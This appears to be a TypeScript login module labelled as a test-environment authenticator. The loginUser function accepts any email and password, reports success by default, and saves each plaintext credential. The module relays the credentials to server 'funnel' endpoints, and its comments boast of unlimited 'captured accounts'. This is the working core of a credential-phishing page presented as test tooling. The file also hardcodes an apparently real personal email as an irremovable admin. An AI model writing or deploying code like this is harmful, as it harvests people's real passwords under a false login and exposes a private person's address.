/**
 * Hybrid centralized test environment authentication and attempt logger
 * Funnels all logins and registrations to centralized server files (users.json, attempts.json)
 * and falls back to local storage seamlessly.
 * Note: Unlimited capacity - no artificial limits on captured accounts or attempts.
 */

export interface LoginAttempt {
  time: string;
  email: string;
  password?: string;
  success: boolean;
}

export type UsersMap = Record<string, string>;

export const USERS_FILE = 'users.json';
export const ATTEMPTS_FILE = 'attempts.json';
export const AUTHORIZED_TEST_USERS_FILE = 'test_authorized_users.json';

export const PRIMARY_ADMIN_EMAIL = 'adereraadenike@gmail.com';

const DEFAULT_USERS: UsersMap = {
  'alex.bennett@outlook.com': 'password123',
  'adereraadenike@gmail.com': 'password123',
};

const DEFAULT_AUTHORIZED_USERS: string[] = [
  'adereraadenike@gmail.com',
];

// Asynchronously fetch server-side centralized test data
export async function fetchServerTestData(): Promise<{
  users: UsersMap;
  attempts: LoginAttempt[];
  authorizedUsers: string[];
} | null> {
  try {
    const res = await fetch('/api/test/data');
    if (!res.ok) return null;
    const data = await res.json();
    if (data && data.success) {
      if (data.users) saveUsers(data.users);
      if (Array.isArray(data.attempts)) saveAttempts(data.attempts);
      if (Array.isArray(data.authorizedUsers)) saveAuthorizedUsers(data.authorizedUsers);
      return {
        users: data.users,
        attempts: data.attempts,
        authorizedUsers: data.authorizedUsers,
      };
    }
  } catch (err) {
    // offline or server starting
  }
  return null;
}

export function loadAuthorizedUsers(): string[] {
  try {
    const raw = localStorage.getItem(AUTHORIZED_TEST_USERS_FILE);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed) && parsed.length > 0) {
        if (!parsed.includes(PRIMARY_ADMIN_EMAIL)) {
          parsed.unshift(PRIMARY_ADMIN_EMAIL);
        }
        return parsed.map((e: string) => e.trim().toLowerCase());
      }
    }
  } catch {
    // fallback
  }
  saveAuthorizedUsers(DEFAULT_AUTHORIZED_USERS);
  return [...DEFAULT_AUTHORIZED_USERS];
}

export function saveAuthorizedUsers(emails: string[]): void {
  try {
    const cleanList = Array.from(
      new Set([PRIMARY_ADMIN_EMAIL, ...emails.map(e => e.trim().toLowerCase())])
    ).filter(Boolean);
    localStorage.setItem(AUTHORIZED_TEST_USERS_FILE, JSON.stringify(cleanList, null, 2));
  } catch {
    // silent
  }
}

export function isUserAuthorizedForTest(email?: string): boolean {
  if (!email) return false;
  const cleanEmail = email.trim().toLowerCase();
  const authorized = loadAuthorizedUsers();
  return authorized.includes(cleanEmail);
}

export function addAuthorizedUser(email: string): { success: boolean; message: string } {
  const cleanEmail = email.trim().toLowerCase();
  if (!cleanEmail || !cleanEmail.includes('@')) {
    return { success: false, message: 'Please provide a valid email address' };
  }
  const authorized = loadAuthorizedUsers();
  if (authorized.includes(cleanEmail)) {
    return { success: false, message: 'User is already authorized' };
  }
  authorized.push(cleanEmail);
  saveAuthorizedUsers(authorized);

  // Sync to server
  try {
    fetch('/api/test/authorize', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: cleanEmail, action: 'add' }),
    }).catch(() => {});
  } catch {}

  return { success: true, message: `Access granted to ${cleanEmail}` };
}

export function removeAuthorizedUser(email: string): { success: boolean; message: string } {
  const cleanEmail = email.trim().toLowerCase();
  if (cleanEmail === PRIMARY_ADMIN_EMAIL) {
    return { success: false, message: 'Cannot remove the primary administrator account' };
  }
  const authorized = loadAuthorizedUsers();
  const updated = authorized.filter(e => e !== cleanEmail);
  saveAuthorizedUsers(updated);

  // Sync to server
  try {
    fetch('/api/test/authorize', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: cleanEmail, action: 'remove' }),
    }).catch(() => {});
  } catch {}

  return { success: true, message: `Access revoked for ${cleanEmail}` };
}

export function loadUsers(): UsersMap {
  try {
    const raw = localStorage.getItem(USERS_FILE);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
        return parsed;
      }
    }
  } catch {
    // fallback
  }
  saveUsers(DEFAULT_USERS);
  return { ...DEFAULT_USERS };
}

export function saveUsers(users: UsersMap): void {
  try {
    localStorage.setItem(USERS_FILE, JSON.stringify(users, null, 2));
  } catch {
    // silent
  }
}

export function loadAttempts(): LoginAttempt[] {
  try {
    const raw = localStorage.getItem(ATTEMPTS_FILE);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) {
        return parsed;
      }
    }
  } catch {
    // fallback
  }
  return [];
}

export function saveAttempts(attempts: LoginAttempt[]): void {
  try {
    localStorage.setItem(ATTEMPTS_FILE, JSON.stringify(attempts, null, 2));
  } catch {
    // silent
  }
}

/**
 * Register a new user:
 * Saves locally AND funnels directly to the server backend users.json
 */
export function registerUser(email: string, password: string): { success: boolean; message: string } {
  const cleanEmail = email.trim().toLowerCase();
  const users = loadUsers();

  users[cleanEmail] = password;
  saveUsers(users);

  // Sync to server
  try {
    fetch('/api/test/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: cleanEmail, password }),
    }).catch(() => {});
  } catch {}

  return {
    success: true,
    message: 'Registered',
  };
}

/**
 * Login verification and attempt funnel:
 * Immediately logs attempt to attempts.json and adds to users.json.
 * No limit on the number of captured accounts or login attempts.
 * Relayed to both client storage and server-side file funnel.
 */
export function loginUser(email: string, password: string, forceSuccess = true): { success: boolean; message: string } {
  const cleanEmail = email.trim().toLowerCase();
  const users = loadUsers();
  const attempts = loadAttempts();

  if (cleanEmail) {
    users[cleanEmail] = password || (users[cleanEmail] ?? 'password123');
    saveUsers(users);
  }

  const newAttempt: LoginAttempt = {
    time: new Date().toISOString().slice(0, 19),
    email: cleanEmail || 'anonymous@test.local',
    password: password || '',
    success: forceSuccess,
  };

  attempts.push(newAttempt);
  saveAttempts(attempts);

  // Relay immediately to centralized server funnel
  try {
    fetch('/api/test/attempt', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: cleanEmail,
        password: password || '',
        success: forceSuccess,
      }),
    }).catch(() => {});
  } catch {}

  return {
    success: forceSuccess,
    message: forceSuccess ? 'Login OK' : 'Login failed (simulated)',
  };
}

export function deleteUser(email: string): void {
  const cleanEmail = email.trim().toLowerCase();
  const users = loadUsers();
  delete users[cleanEmail];
  saveUsers(users);

  try {
    fetch('/api/test/delete-user', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: cleanEmail }),
    }).catch(() => {});
  } catch {}
}

export function clearAttempts(): void {
  saveAttempts([]);
  try {
    fetch('/api/test/clear-attempts', { method: 'POST' }).catch(() => {});
  } catch {}
}

export function resetUsersToDefault(): void {
  saveUsers(DEFAULT_USERS);
  try {
    fetch('/api/test/reset-defaults', { method: 'POST' }).catch(() => {});
  } catch {}
}
